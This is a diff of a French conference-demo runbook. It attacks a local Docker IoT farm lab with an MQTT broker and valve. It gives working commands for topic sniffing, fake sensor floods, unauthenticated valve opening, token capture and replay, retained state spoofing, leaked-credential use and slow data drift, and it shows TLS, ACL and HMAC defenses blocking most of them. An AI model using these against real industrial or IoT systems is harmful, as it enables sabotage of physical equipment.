@@ -1,338 +1,273 @@
-# Démo GDG Lomé 2026 — commandes, dans l'ordre des slides
+# Démo GDG Lomé 2026 — commandes brutes, dans l’ordre des slides
 
-Runbook autonome : **chaque commande est écrite en entier**, sans script `.sh`
-et sans alias (`run`/`atk`). Les sections suivent **l'ordre des slides** et portent
-le **numéro de slide** devant, pour se repérer pendant le talk. À exécuter depuis
-`gdg_lome/2026/demos`. Sous chaque commande, la ligne de résultat attendue.
+Runbook autonome : **aucun script d’attaque**, **aucun `attack.py`**. Chaque attaque est
+une **commande brute** (`nmap`, `mosquitto_pub`, `mosquitto_sub`, `curl`), tapée en direct
+pour que tout soit explicite. À exécuter depuis `gdg_lome/2026/demos`.
 
-Convention : `$` = invite du shell, ne pas le taper.
+## Deux terminaux
 
-**Deux terminaux.** Les commandes marquées `# [hôte]` (celles en `docker compose`,
-`curl`, `FARM_MODE=…`) se tapent dans le terminal **hôte** ; **toutes les autres** se
-tapent dans le **shell de l'attaquant** ouvert à la slide 4 (voir « Démarrer l'attaquant »),
-sans préfixe `docker`.
-
-Repère rapide :
-
-| Slide | Étape | Section |
+| Terminal | Rôle | Invite |
 |---|---|---|
-| — | Préparation (avant le talk) | [§ Préparation](#préparation--avant-le-talk-aucune-slide) |
-| 4 | Démarrer la ferme (insecure) | [Slide 4](#slide-4--la-cible--démarrer-la-ferme) |
-| 6 | Acte 1 — Reconnaissance | [Slide 6](#slide-6--acte-1--reconnaissance) |
-| 7 | Acte 2 — Mentir et agir | [Slide 7](#slide-7--acte-2--mentir-et-agir) |
-| 9 | Défense naïve (mode secure) | [Slide 9](#slide-9--défense-naïve-mode-secure) |
-| 10 | Acte 3 — Voler le token | [Slide 10](#slide-10--acte-3--voler-le-token-sur-le-bus) |
-| 11 | Acte 3 — Rendre l'opérateur aveugle | [Slide 11](#slide-11--acte-3--rendre-lopérateur-aveugle) |
-| 12 | Acte 3 — Empoisonner sans dépasser | [Slide 12](#slide-12--acte-3--empoisonner-sans-dépasser) |
-| 14 | Mode hardened | [Slide 14](#slide-14--mode-hardened-tls-identité-acl) |
-| 17 | Acte 4 — Les mêmes attaques | [Slide 17](#slide-17--acte-4--les-mêmes-attaques-en-mode-hardened) |
-| 18 | La limite — dérive lente | [Slide 18](#slide-18--la-limite--la-dérive-lente) |
-| 19-21 | Remise à zéro et suppression | [§ Après le talk](#après-le-talk--remise-à-zéro-et-suppression) |
+| **[hôte]** | bascule de mode, journal de la ferme, vérification d’état | `$` sur la machine |
+| **[attaquant]** | shell **Kali** dans le conteneur `attacker` ; on y tape les attaques | `root@…:/app#` |
 
-> Slides sans démo (discours seul) : 1, 2, 3, 5, 8, 13, 15, 16, 19, 20, 21.
-> Les slides **15** (HMAC) et **16** (détection) expliquent les contrôles dont la
-> démo tombe en slide **17** et **18**.
+> L’attaquant est un conteneur **Kali Linux persistant** : on le lance **une fois** et on
+> garde son shell ouvert tout le talk. `nmap`, `mosquitto_pub/sub`, `curl`, `python3` y
+> sont déjà installés. Les identifiants « fuités » du mode hardened sont dans son
+> environnement (`$LEAK_VIEWER_PASS`, `$LEAK_MAINTENANCE_PASS`, `$LEAK_SENSOR02_PASS`).
+
+Convention : `$` = invite, ne pas le taper. Depuis le shell attaquant, le dashboard est
+`http://dashboard:8080` ; depuis l’hôte, `http://127.0.0.1:8080`.
 
 ---
 
-## Préparation — avant le talk (aucune slide)
-
-> À faire **une fois** par machine, avec Internet. Le jour J, commencer à la slide 4.
-> Déjà fait sur la machine du speaker (tout est git-ignoré, rien n'est publié).
-
-### P.1 Fichiers de configuration (déjà dans le dépôt)
-
-`compose.yaml` (lit `FARM_MODE` depuis `.env`), `mosquitto/insecure.conf`,
-`secure.conf`, `hardened.conf`, `mosquitto/acl`.
-
-### P.2 Créer le `.env` et ses secrets
+## Préparation — une fois par machine (avec Internet)
 
 ```bash
-cp .env.example .env
-printf 'CMD_HMAC_KEY=%s\n' "$(openssl rand -hex 24)" >> .env
-printf 'MQTT_PASS_SIMULATOR=%s\n' "$(openssl rand -hex 24)" >> .env
-printf 'MQTT_PASS_DASHBOARD=%s\n' "$(openssl rand -hex 24)" >> .env
+docker pull eclipse-mosquitto:2 kalilinux/kali-rolling   # [hôte]
+bash scripts/setup.sh                                     # .env, secrets, PKI, comptes, images
 ```
 
-### P.3 PKI de démo (CA + certificat broker) — pour le mode hardened
-
-```bash
-mkdir -p mosquitto/tls/ca mosquitto/tls/server mosquitto/tls/public mosquitto/secrets
-
-openssl req -x509 -newkey rsa:2048 -nodes -days 365 -sha256 \
-  -subj "/CN=GDG Lome Farm Lab CA" \
-  -keyout mosquitto/tls/ca/ca.key -out mosquitto/tls/ca/ca.crt
-
-openssl req -newkey rsa:2048 -nodes -sha256 -subj "/CN=mosquitto" \
-  -keyout mosquitto/tls/server/server.key -out /tmp/server.csr
-
-printf 'subjectAltName=DNS:mosquitto,DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=serverAuth\n' > /tmp/ext.cnf
-
-openssl x509 -req -in /tmp/server.csr -days 365 -sha256 \
-  -CA mosquitto/tls/ca/ca.crt -CAkey mosquitto/tls/ca/ca.key -CAcreateserial \
-  -extfile /tmp/ext.cnf -out mosquitto/tls/server/server.crt
-
-cp mosquitto/tls/ca/ca.crt mosquitto/tls/server/ca.crt
-cp mosquitto/tls/ca/ca.crt mosquitto/tls/public/ca.crt
-chmod 644 mosquitto/tls/server/server.key
-rm -f /tmp/server.csr /tmp/ext.cnf mosquitto/tls/ca/ca.srl
-```
-
-### P.4 Comptes MQTT du mode hardened
-
-```bash
-set -a; . ./.env; set +a
-
-docker run --rm -v "$PWD/mosquitto/secrets:/work" eclipse-mosquitto:2 sh -c "
-  rm -f /work/passwd && touch /work/passwd &&
-  mosquitto_passwd -b /work/passwd simulator   '$MQTT_PASS_SIMULATOR' &&
-  mosquitto_passwd -b /work/passwd dashboard   '$MQTT_PASS_DASHBOARD' &&
-  mosquitto_passwd -b /work/passwd viewer      '$LEAK_VIEWER_PASS' &&
-  mosquitto_passwd -b /work/passwd maintenance '$LEAK_MAINTENANCE_PASS' &&
-  mosquitto_passwd -b /work/passwd sensor-02   '$LEAK_SENSOR02_PASS' &&
-  chmod 644 /work/passwd"
-```
-
-### P.5 Construire les images
-
-```bash
-docker compose --profile attack build
-```
+`setup.sh` est idempotent (`--force` régénère PKI et secrets). Le build de l’image Kali
+prend quelques minutes la première fois.
 
 ---
 
-## Slide 4 — « La cible » : démarrer la ferme
-
-Mode insecure, services recréés à neuf :
+## Slide 8 — Démarrer la ferme (mode insecure)
 
 ```bash
-docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
+bash scripts/mode.sh insecure                             # [hôte]
+curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"insecure"
 ```
 
-Vérifier l'état :
+Ouvrir le tableau de bord : <http://127.0.0.1:8080>. Second terminal **[hôte]**, fenêtre
+« ferme » (laisser tourner) :
 
 ```bash
-curl -s http://127.0.0.1:8080/api/state   # [hôte]
+docker compose logs -f --tail 0 simulator dashboard       # [hôte]
 ```
-Attendu : `"mode":"insecure"`, `"valve":"CLOSED"`, `"score"` proche de `95`.
 
-Ouvrir le tableau de bord : <http://127.0.0.1:8080>
-
-Second terminal, fenêtre « ferme » (laisser tourner tout le talk) :
+Lancer l’attaquant **une seule fois** et ouvrir son shell :
 
 ```bash
-docker compose logs -f --tail 0 simulator dashboard   # [hôte]
+docker compose --profile attack up -d attacker            # [hôte] démarre Kali (persistant)
+docker compose exec attacker bash                         # [hôte] → invite root@…:/app#
 ```
 
-### Démarrer l'attaquant — une seule fois (à garder ouvert tout le talk)
-
-Troisième terminal. On lance le conteneur attaquant **une fois** et on ouvre un shell
-dedans ; toutes les commandes d'attaque des slides suivantes se tapent ici, **sans
-préfixe `docker`**. L'attaquant reste vivant quand on change de mode.
-
-```bash
-docker compose --profile attack up -d attacker   # [hôte] démarre l'attaquant (persistant)
-docker compose exec attacker bash                 # [hôte] ouvre le shell → invite root@…:/app#
-```
-
-Raccourci équivalent : `bash scripts/attack.sh`. Outils déjà présents dans le shell :
-`attack.py`, `nmap`, `mosquitto_pub`/`mosquitto_sub`.
+À partir d’ici, les commandes **[attaquant]** se tapent dans ce shell Kali.
 
 ---
 
-## Slide 6 — Acte 1 : Reconnaissance
+## Slide 9 — Acte I : Reconnaissance
 
 ```bash
-nmap -sV -p 1883,8883,8080 mosquitto dashboard
+nmap -sT -sV -p 1883,8883,8080 mosquitto dashboard        # [attaquant]
 ```
-Attendu : `1883/tcp open mosquitto version 2.1.4`, `8080/tcp open http Werkzeug httpd 3.1.9`.
+Attendu : `1883/tcp open mosquitto 2.1.4`, `8080/tcp open http Werkzeug/Python`.
 
 ```bash
-mosquitto_sub -h mosquitto -t '#' -v -W 6
+mosquitto_sub -h mosquitto -t '#' -v -W 6                 # [attaquant]
 ```
-Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`, `farm/actuator/valve/state`.
+Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`,
+`farm/actuator/valve/state`. Le broker anonyme laisse tout lire.
 
 ---
 
-## Slide 7 — Acte 2 : Mentir et agir
+## Slide 10 — Acte II : Mentir et agir
 
 ```bash
-python attack.py flood --value 0 --count 15
+# [attaquant] 15 fausses mesures « humidité = 0 »
+for i in $(seq 1 15); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done
 ```
-Attendu : `[flood] 15 mesures humidité=0.0 — broker : accepté`.
 
 ```bash
-curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
+# [attaquant] ouvrir la vanne sans aucun token
+curl -i -X POST http://dashboard:8080/api/valve/open
 ```
 Attendu : `HTTP/1.1 200 OK`, `{"command":"OPEN",...,"mode":"insecure"}`.
 
 ```bash
-python attack.py state
+curl -s http://dashboard:8080/api/state                   # [attaquant]
 ```
-Attendu : `vanne=OPEN débit≈34 L/min score=0 impact≈2 000 000 FCFA`.
+Attendu : `vanne=OPEN`, `flow≈34 L/min`, `score=0`, `impact≈2 000 000 FCFA`.
 
 ---
 
-## Slide 9 — Défense naïve (mode secure)
-
-Basculer en mode secure (le `FARM_MODE` inline suffit, aucun script) :
+## Slide 12 — Défense naïve (passage en mode secure)
 
 ```bash
-FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
+# [hôte] bascule : seuls mosquitto, simulator, dashboard sont recréés (l’attaquant reste)
+FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard
+curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"secure"
 ```
-```bash
-curl -s http://127.0.0.1:8080/api/state   # [hôte]
-```
-Attendu : `"mode":"secure"`.
 
-> Les commandes d'attaque suivantes (dans le shell attaquant) ne changent plus le mode.
-> Le mode ne change qu'avec un nouveau `docker compose up` et un `FARM_MODE` différent.
-
-Montrer que les contrôles marchent — humidité rejetée :
+Montrer que les contrôles « évidents » marchent :
 
 ```bash
-python attack.py flood --value 0 --count 15
+# [attaquant] humidité hors plage → rejetée [20,100]
+for i in $(seq 1 5); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done
+# [attaquant] vanne sans token → 403
+curl -i -X POST http://dashboard:8080/api/valve/open
 ```
-Attendu (fenêtre ferme) : `humidité 0.0 REJETÉE : hors plage [20, 100]`.
-
-Vanne refusée sans token :
-
-```bash
-curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
-```
-Attendu : `HTTP/1.1 403 FORBIDDEN`, `{"error":"token requis"}`.
+Attendu (fenêtre ferme) : `humidité 0.0 REJETÉE : hors plage [20, 100]` ; et `HTTP/1.1 403 FORBIDDEN`.
 
 ---
 
-## Slide 10 — Acte 3 : Voler le token sur le bus
+## Slide 14 — Acte III : Voler le token sur le bus
+
+Capturer une commande légitime (lancer, puis l’opérateur ouvre la vanne via l’API) :
 
 ```bash
-python attack.py replay --simulate-operator --close-first
+# [attaquant] capture UNE commande sur le bus
+mosquitto_sub -h mosquitto -t farm/actuator/valve -C 1
 ```
-Attendu : `commande capturée : {"command": "OPEN", "token": "gdg-demo-token"}` puis
-`rejeu ... — broker : accepté`. Fenêtre ferme : `valve -> OPEN` après la fermeture par l'opérateur.
+Pendant ce temps, l’opérateur (ou vous, pour la démo) ouvre la vanne légitimement :
+
+```bash
+# [attaquant/hôte] action de l’opérateur légitime (avec token)
+curl -s -X POST -H "Authorization: Bearer gdg-demo-token" http://dashboard:8080/api/valve/open
+```
+La capture affiche : `{"command":"OPEN","token":"gdg-demo-token"}`.
+
+Rejouer la commande capturée — le broker l’accepte :
+
+```bash
+# [attaquant] rejeu
+mosquitto_pub -h mosquitto -t farm/actuator/valve \
+  -m '{"command":"OPEN","token":"gdg-demo-token"}'
+```
+Attendu (fenêtre ferme) : la vanne se rouvre après la fermeture par l’opérateur.
 
 ---
 
-## Slide 11 — Acte 3 : Rendre l'opérateur aveugle
-
-Publier un faux état de vanne retenu :
+## Slide 15 — Acte III : Aveugler et empoisonner
 
 ```bash
+# [attaquant] faux état de vanne RETENU : l’écran affiche CLOSED
 mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
 ```
 Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indique ~33 L/min.
 
----
-
-## Slide 12 — Acte 3 : Empoisonner sans dépasser
-
 ```bash
-python attack.py flood --value 25 --count 30
+# [attaquant] empoisonner DANS la plage : 25 % passe le filtre
+for i in $(seq 1 30); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 25; done
+curl -s http://dashboard:8080/api/state
 ```
-```bash
-python attack.py state
-```
-Attendu : `mode=secure vanne=CLOSED score≈21 impact≈1 500 000 FCFA`, aucune trace du rejeu dans le journal.
+Attendu : `mode=secure`, `vanne(affiché)=CLOSED`, `score≈16`, impact ~1,5 M FCFA, **aucune trace** du rejeu.
 
 ---
 
-## Slide 14 — Mode hardened (TLS, identité, ACL)
+## Slide 17 — Mode hardened (TLS, identité, ACL, HMAC)
 
 ```bash
-FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
+# [hôte]
+FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard
+curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"hardened"
 ```
-```bash
-curl -s http://127.0.0.1:8080/api/state   # [hôte]
-```
-Attendu : `"mode":"hardened"`.
+
+> En hardened, un `mosquitto_pub` refusé par l’ACL ou par la signature **n’affiche pas
+> d’erreur côté client** : le rejet se lit dans le **journal du dashboard** (fenêtre ferme)
+> et sur l’état de la vanne (reste CLOSED).
 
 ---
 
-## Slide 17 — Acte 4 : Les mêmes attaques, en mode hardened
+## Slide 21 — Acte IV : Les mêmes attaques, bloquées
 
-Accès anonyme refusé (TLS + comptes) :
-
-```bash
-python attack.py anon
-```
-Attendu : `1883 ... Connection refused` et `8883 ... REFUSÉ par le broker (Not authorized)`.
-
-ACL — lecture limitée aux capteurs (identité « viewer » fuitée) :
+Anonyme refusé (1883 fermé, 8883 n’accepte pas l’anonyme) :
 
 ```bash
-python attack.py sniff --as viewer --topic 'farm/#' --seconds 4
+# [attaquant]
+mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -t '#' -C 1
 ```
-Attendu : seuls des messages `farm/sensor/*` apparaissent.
+Attendu : `Connection Refused: not authorised`.
 
-ACL — écriture refusée :
+ACL — « viewer » (identité fuitée) ne voit que les capteurs :
 
 ```bash
-python attack.py flood --as viewer --value 0 --count 2
+# [attaquant]
+mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u viewer -P "$LEAK_VIEWER_PASS" -t 'farm/#' -v -W 4
 ```
-Attendu : `broker : REFUSÉ (Not authorized)`.
+Attendu : uniquement des `farm/sensor/*` ; aucun `farm/actuator/*`.
 
-ACL — faux état refusé (identité « sensor-02 ») :
-
-```bash
-python attack.py spoof-state --as sensor-02 --state CLOSED
-```
-Attendu : `broker : REFUSÉ (Not authorized)`.
-
-Rejeu bloqué par le nonce (identité « maintenance », qui a le droit vanne) — illustre la slide 15 :
+ACL — « viewer » ne peut pas écrire ; « sensor-02 » ne peut pas forger l’état (rejet
+silencieux côté client, visible dans le journal) :
 
 ```bash
-python attack.py replay --as maintenance --simulate-operator --close-first
+# [attaquant]
+mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u viewer -P "$LEAK_VIEWER_PASS" -t farm/sensor/humidity -m 0
+mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u sensor-02 -P "$LEAK_SENSOR02_PASS" -t farm/actuator/valve/state -r -m CLOSED
 ```
-Commande forgée sans la clé HMAC :
+
+Forger une commande sans la clé HMAC (en « maintenance », qui a le droit vanne) :
 
 ```bash
-python attack.py forge --as maintenance
+# [attaquant]
+mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve \
+  -m '{"command":"OPEN","token":"gdg-demo-token"}'
 ```
+Attendu (journal) : `commande OPEN REJETÉE : signature HMAC invalide`.
+
+Rejouer une commande signée capturée → nonce déjà utilisé :
+
 ```bash
-python attack.py state
+# [attaquant] capturer la commande signée pendant que l’opérateur ouvre la vanne
+mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -C 1
+# (opérateur légitime)
+curl -s -X POST -H "Authorization: Bearer gdg-demo-token" http://dashboard:8080/api/valve/open
+# rejeu de la commande signée capturée
+mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -m '<commande capturée>'
 ```
-Attendu (journal) : `rejeu détecté (nonce déjà utilisé)` puis `signature HMAC invalide`.
+Attendu (journal) : `commande OPEN REJETÉE : rejeu détecté (nonce déjà utilisé)`.
+
+```bash
+curl -s http://dashboard:8080/api/state                   # [attaquant] → vanne=CLOSED
+```
 
 ---
 
-## Slide 18 — La limite : la dérive lente
+## Slide 22 — La limite : saut détecté, puis dérive lente
 
-Saut brutal détecté (illustre la slide 16) :
-
-```bash
-python attack.py flood --as sensor-02 --value 25 --count 10
-```
-Attendu : `humidité 25.0 REJETÉE : saut anormal (...)`.
-
-Dérive lente, sous le seuil :
+Saut brutal détecté :
 
 ```bash
-python attack.py drift --as sensor-02
+# [attaquant] sensor-02 publie 25 après ~65 → saut anormal
+for i in $(seq 1 10); do mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
+  -u sensor-02 -P "$LEAK_SENSOR02_PASS" -t farm/sensor/humidity -m 25; sleep 0.2; done
 ```
+Attendu (journal) : `humidité 25.0 REJETÉE : saut anormal (… → 25.0)`.
+
+Dérive lente, sous le seuil (4 mesures par palier pour dominer la médiane) :
+
 ```bash
-python attack.py state
+# [attaquant]
+for v in $(seq 65 -2 25); do for j in 1 2 3 4; do mosquitto_pub -h mosquitto -p 8883 \
+  --cafile /certs/ca.crt -u sensor-02 -P "$LEAK_SENSOR02_PASS" \
+  -t farm/sensor/humidity -m $v; done; sleep 0.1; done
+curl -s http://dashboard:8080/api/state
 ```
-Attendu : `score≈25` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).
+Attendu : `score≈21` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).
 
 ---
 
-## Après le talk — remise à zéro et suppression (slides 19-21)
-
-Revenir en insecure pour une nouvelle démo :
+## Après le talk — remise à zéro et arrêt
 
 ```bash
-FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
-python attack.py reset
+# [hôte] revenir en insecure pour une nouvelle démo
+FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard
+curl -s -X POST http://127.0.0.1:8080/api/reset            # [hôte] remise à zéro du modèle
 ```
-
-Arrêter (garde images et secrets) :
 
 ```bash
-docker compose down
+docker compose down                                        # [hôte] garde images + secrets
 ```
 
-Tout supprimer — conteneurs, réseau, images, secrets locaux (machine prêtée/partagée) :
+Tout supprimer (machine prêtée/partagée) :
 
 ```bash
 docker compose --profile attack down --rmi local --remove-orphans
@@ -343,10 +278,11 @@ rm -rf mosquitto/tls mosquitto/secrets .env
 
 ## Aide-mémoire des modes
 
-| Mode | Slide | Commande de bascule |
+| Mode | Slide | Bascule [hôte] |
 |---|---|---|
-| insecure | 4 | `FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard` |
-| secure | 9 | `FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard` |
-| hardened | 14 | `FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard` |
+| insecure | 8 | `FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard` |
+| secure | 12 | `FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard` |
+| hardened | 18 | `FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard` |
 
-Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state`.
+Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state` (hôte) ou
+`curl -s http://dashboard:8080/api/state` (attaquant).
